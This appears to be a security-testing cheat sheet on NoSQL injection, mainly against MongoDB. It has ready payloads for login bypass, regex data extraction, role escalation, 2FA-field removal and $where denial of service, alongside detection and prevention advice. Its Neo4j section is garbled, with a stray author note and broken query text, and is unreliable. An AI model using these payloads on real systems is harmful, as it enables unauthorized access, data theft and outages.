---
title: NoSQL Injection
---

# NoSQL Injection

## NoSQL Injection Fundamentals

### What is NoSQLi?

NoSQL Injection occurs when untrusted user input is embedded into NoSQL queries without proper validation or sanitization, leading to unauthorized actions such as authentication bypass, data theft, or remote code execution. It can be exploited via syntax injection and operator injection.

- Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.
- Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

### SQLi vs NoSQLi

| Aspect | SQL Injection | NoSQL Injection |
| --- | --- | --- |
| Query Language | SQL | JSON, BSON, JavaScript, Lua |
| Syntax | `' OR '1'='1` | `{"$ne": null}` |
| Execution Context | DB server | App server / DB engine |
| Query Formation | String concatenation | JSON/JavaScript embedding |
| DB Targets | MySQL, PostgreSQL | MongoDB, CouchDB, Firebase, Redis |
| Operator Usage | Logical/Arithmetic (AND, OR) | `$ne`, `$gt`, `$regex`, `$where` |

---

## Attack Surface

Common locations to probe for NoSQL injection:

| Entry Point | Example |
| --- | --- |
| **Login / Auth endpoints** | `POST /login` with username/password JSON body |
| **Search and filter APIs** | `GET /api/products?name=shirt`, filter parameters |
| **GraphQL queries** | Nested query variables passed to MongoDB resolver |
| **ODM/ORM layer** | Mongoose `.find()` / `.findOne()` with unsanitized input |
| **HTTP GET params** | `?id[$ne]=0`, `?role[$in][]=admin` |
| **Cookie / Header values** | Session token, role header passed to DB lookup |
| **Password reset flows** | Email lookup query built from user-supplied email |
| **JSON API body** | Any field accepting object-type input in JSON |

## Operator-Based Injection

Exploiting MongoDB query operators to manipulate database logic and bypass security controls.

| Operator | Description | Use Case | Payload Example |
| --- | --- | --- | --- |
| $ne | Not equal | Auth bypass / inequality | {"user": {"$ne": null}} |
| $gt / $lt | Greater/Less than | Dump data / type confusion | {"age": {"$gt": 0}} |
| $in / $nin | In / Not in array | Value bruteforce / DoS | {"id": {"$in": [1,2,3,4]}} |
| $or / $and | Logical OR/AND | Auth bypass / logic abuse | {"$or": [{"admin": true}, {}]} |
| $exists | Field existence check | Discover hidden fields | {"SSN": {"$exists": true}} |
| $regex | Regular expression | Blind enumeration | {"email": {"$regex": "^a"}} |
| $where | JavaScript expression | RCE / complex logic bypass | {"$where": "return true"} |
| $not | Invert operator result | Reverse filter conditions | {"age": {"$not": {"$gt": 10}}} |

Common Patterns:

```
{"username": {"$ne": null}, "password": {"$ne": null}}     // Bypass login with inequality
{"role": {"$in": ["admin", "moderator"]}}                  // Privilege enumeration
{"isActive": {"$exists": false}}                           // Find incomplete records
{"price": {"$gt": 0, "$lt": 999999}}                       // Extract all records in range
```

---

## **Syntax Injection**

### String Context Break

```
admin' || '1'=='1                                           // Always true
admin' && this.password.match(/.*/)//                       // Regex bypass + comment
```

### JavaScript Injection ($where)

```
{"$where": "sleep(5000)"}                                   // Time-based blind
{"$where": "this.password[0]=='a'"}                         // Extract character
{"$where": "this.password.length==8"}                       // Length check
```

### JSON Injection

```
", "password": {"$ne": null}, "x": "                        // Inject operator
", "$or": [{"admin": true}, {"x": "                         // Inject OR logic
```

### Detection

```
' || 1==1//                                                  // Should succeed
' && 0==1//                                                  // Should fail
' || sleep(5000)//                                           // Time delay
```

---

## Exploitation & Bypassing defenses

### 1. Authentication Bypass

**Use Cases**: Login without valid credentials.

**Test Cases / Payloads**:

- HTTP data
    
    ```
    username[$ne]=toto&password[$ne]=toto
    login[$regex]=a.*&pass[$ne]=lol
    login[$gt]=admin&login[$lt]=test&pass[$ne]=1
    login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
    ```
    
- JSON data
    
    ```
    {"username": {"$ne": null}, "password": {"$ne": null}}
    {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
    {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
    {"username": {"$gt":""}, "password": {"$gt":""}}
    {"username": {"$exists": true}, "password": {"$regex": ".*"}}
    {"$or": [{"user": "admin"}, {"user": {"$ne": null}}]}
    ```
    

---

### 2. Data Extraction

**Blind via Regex Bruteforce**:

```json
{"email": {"$regex": "^a"}}
{"email": {"$regex": "^admin.*@example\\\\.com"}}
```

**Error-Based / Full Dump**:

```json
{"user": {"$gt": ""}}     // Returns all users
{"age": {"$lt": 150}}     // Type probing
```

---

### 3. Privilege Escalation

**Elevating User Roles or Creating Admins**:

```json
{"username": "attacker", "$set": {"role": "admin"}}        // MongoDB operator injection - updates role to admin
{"username": "hacker", "role": "admin", "password": "backdoor"}  // Direct privilege escalation - creates admin user with known password
```

---

### 4. Denial of Service (DoS)

**CPU / Infinite Loop**:

```json
{"$where": "while(true){}"}  // MongoDB
```

**Memory Exhaustion**:

```json
{"id": {"$in": [1,2,...,100000]}}  // Massive $in array
```

---

### 5. Remote Code Execution (RCE)

MongoDB Server-Side JavaScript Injection: Exploits $where operator which executes JavaScript on MongoDB server

```
{"$where": "sleep(10000)"}    // Time-based: 10 second delay confirms execution
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}  // Boolean-based: extracts data via regex
{"$where": "var date = new Date(); while(new Date() - date < 5000){}"}  // CPU-based time delay (5 seconds)
```

Note: $where is deprecated in modern MongoDB versions but still found in legacy systems.

---

### 6. Schema Manipulation & Tampering

**Inject/Remove Fields**:

```json
{"username": "victim", "isAdmin": true}
{"$unset": {"password": ""}}  // Deletes password field
```

---

## Advance Attack Scenarios

### 1. Second-Order NoSQL Injection

Input is stored safely but injected into a query later when retrieved:

1. Register a user with username: `{"$gt": ""}` (stored as-is in the DB).
2. Later, when the app queries: `db.users.find({username: <stored_value>})` — the stored operator activates.

### 2. MongoDB Aggregation Pipeline Injection

If user input is embedded in a `$match` stage:

```json
db.collection.aggregate([
  { "$match": { "role": "<USER_INPUT>" } }
])
```

**Payload:** `{"$ne": "user"}` → returns all non-user records.

### 3. GraphQL + MongoDB Injection

GraphQL resolvers that pass arguments directly to MongoDB:

```graphql
query {
  user(filter: "{\"role\":{\"$ne\":\"user\"}}") {
    name email role
  }
}
```

### 4. Neo4j Database (graph-oriented database)

**Cypher Injections**

`query = f"MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower('{name}') RETURN m.title` AS title”

For returning all records: // Check the below query, is ** the part of this query.

`query = f"MATCH (m:Movie) WHERE toLower(m.title) CONTAINS toLower**('test') or 1=1 return m.title AS title**// RETURN m.title AS title"`

Payload: **test') or 1=1 return m.title AS title//**

## Payload Repository

```json
// Fuzz Strings
$
{
}
\\
"
`
;
%00
' " \\ ; { }

// Auth Bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$or": [{"role": "admin"}, {"role": {"$ne": "user"}}]}

// Regex Brute
{"email": {"$regex": "^a.*"}}
{"password": {"$regex": "^.{8,}$"}}

// Time Based
{"$where": "sleep(5000)"}
{"$where": "function() { return true; }"}

// Extracting Data with time delays
"$where": "if(this.token.startsWith('a')) {sleep(5000); return true;} else {return true;}"

// DoS
{"id": {"$in": [1,2,3,...10000]}}

// Schema Abuse
{"$set": {"role": "admin"}}
{"$unset": {"2FA": ""}}

// Javascript Execution
$where: function() { //arbitrary JavaScript here }
"$where":"Object.keys(this)[0].match('^.{0}a.*')"  // Extracting field names

```

---

## Test Cases

| Scenario | Payload | Expected Outcome |
| --- | --- | --- |
| Auth bypass (URL-encoded) | `username[$ne]=x&password[$ne]=x` | Login succeeds without valid credentials |
| Auth bypass (JSON) | `{"username":{"$ne":null},"password":{"$ne":null}}` | Login succeeds |
| OR logic bypass | `{"$or":[{"user":"admin"},{"user":{"$ne":null}}]}` | Returns admin user or all users |
| Regex enumeration | `{"email":{"$regex":"^a"}}` | Response differs if field starts with 'a' |
| Time-based blind | `{"$where":"sleep(5000)"}` | ~5 second delay in response |
| Field existence probe | `{"SSN":{"$exists":true}}` | Returns records that have SSN field |
| DoS via large `$in` | `{"id":{"$in":[1,2,...,100000]}}` | Server slowdown or timeout |
| Schema tampering | `{"$set":{"role":"admin"}}` | User role elevated if update endpoint vulnerable |
| Neo4j Cypher injection | `test') or 1=1 return m.title AS title//` | All records returned |
| Regex length probe | `{"password":{"$regex":"^.{8}$"}}` | Confirms password length = 8 |

## Detection Techniques

### A. Manual Detection

1. **Character fuzzing** — Send `'`, `"`, `{`, `}`, `;`, `$`, `\x00` in all input fields and observe errors, behavior changes, or timing differences.
2. **Operator injection** — Change `username=admin` to `username[$ne]=admin` in URL-encoded POST body. If login succeeds, injection is possible.
3. **JSON operator injection** — If API accepts JSON, replace `"password": "test"` with `"password": {"$ne": null}`. Successful login = vulnerable.
4. **Boolean test** — Send `' || 1==1//` (should succeed) and `' && 0==1//` (should fail). Differing responses confirm injection.
5. **Time-based blind** — Send `{"$where": "sleep(5000)"}` and observe if response takes ~5 seconds.
6. **Regex brute-force** — Test `{"field": {"$regex": "^a"}}`, `{"field": {"$regex": "^b"}}` etc. to enumerate field values one character at a time.

### B. Automated Tools

| Tool | Usage |
| --- | --- |
| **NoSQLMap** | Automated detection and exploitation of NoSQLi across MongoDB, CouchDB |
| **Burp Suite** (Intruder, Turbo Intruder) | Fuzz operator payloads, brute-force regex enumeration |
| **OWASP ZAP** | Active scanning with NoSQLi passive and active rules |
| **Nuclei** | Templates for known NoSQLi CVEs and common patterns |

---

## Impact

- **Authentication Bypass** — Log in without valid credentials using `$ne`, `$gt`, `$regex`.
- **Data Exfiltration** — Dump all records or enumerate field values character by character via regex.
- **Privilege Escalation** — Inject `$set: {"role": "admin"}` to elevate account permissions.
- **Denial of Service** — Infinite loops via `$where: "while(true){}"` or massive `$in` arrays crash the DB.
- **Remote Code Execution** — `$where` JavaScript execution on legacy MongoDB enables server-side RCE.
- **Schema Tampering** — Delete or modify fields (`$unset`, `$set`) to remove 2FA, alter roles.
- **Information Disclosure** — Reveal hidden fields, schema structure, or database metadata.

## Prevention & Mitigation

| Technique | Description |
| --- | --- |
| Input Validation | Block `$`, `{}`, `[`, `;`, and operators in input |
| **Parameterization** | Use driver-native query building (e.g. `find({})`) |
| **Disable JS in DB** | MongoDB: `--noscripting` or restrict `$where` operator |
| **Access Control** | Use DB roles with principle of least privilege |
| **Web Application Firewall (WAF)** | Block typical operator strings in input |
| **Logging & Monitoring** | Alert on operator patterns or repeated regex use |
| **Sanitization Libraries** | Use libraries like `mongo-sanitize` (Node.js) |

---

## Good To Read

- **HackerOne Hacktivity** —
    - https://hackerone.com/reports/1130874
    - https://hackerone.com/reports/1458020
    - [https://hackerone.com/reports/1130721](https://hackerone.com/reports/1130721)
- **PortSwigger Web Security Academy** — NoSQL injection lab track.
- **Bugcrowd VRT** — Injection > NoSQL Injection for severity context.

## References

[https://portswigger.net/web-security/nosql-injection](https://portswigger.net/web-security/nosql-injection)

[https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)

[https://www.vaadata.com/blog/what-is-nosql-injection-exploitations-and-security-best-practices/](https://www.vaadata.com/blog/what-is-nosql-injection-exploitations-and-security-best-practices/)

[https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities)

[https://medium.com/@srkasthuri/hacking-apps-using-nosql-injections-2ac6195bed2e](https://medium.com/@srkasthuri/hacking-apps-using-nosql-injections-2ac6195bed2e)

[https://payatu.com/blog/nosql-injection/](https://payatu.com/blog/nosql-injection/)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQI%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)